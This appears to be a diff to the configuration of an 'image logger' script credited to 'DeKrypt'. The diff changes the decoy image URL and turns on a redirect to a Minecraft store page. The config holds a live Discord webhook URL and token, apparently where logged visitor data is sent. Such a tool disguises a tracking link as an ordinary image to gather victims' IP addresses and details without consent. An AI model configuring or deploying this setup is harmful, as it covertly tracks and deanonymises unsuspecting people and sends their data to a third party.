@@ -11,7 +11,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1346403158162800660/M_kDldAOrgbfEOmgAAhFBW0JleXe30ubVBdqGGKjBm89qLmlqC4HTxJRVflQ6Cdum3J3",
-    "image": "https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExcGVpOW56ODlidzB4bnE0ZnJzYjIzZDd4ajd1dG9kb3d0bG9iOWd3ayZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/TGG3ASscmS29SUheCd/giphy.gif", # You can also have a custom image by using a URL argument
+    "image": "https://th.bing.com/th/id/OIP.Xc6QPXH_WXlGYFj3f1FJXgHaDr?rs=1&pid=ImgDetMain", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -48,8 +48,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://lickerdiscord.vercel.app/api/image.py" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect to a webpage?
+        "page": "https://survivaladventures.craftingstore.net/" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
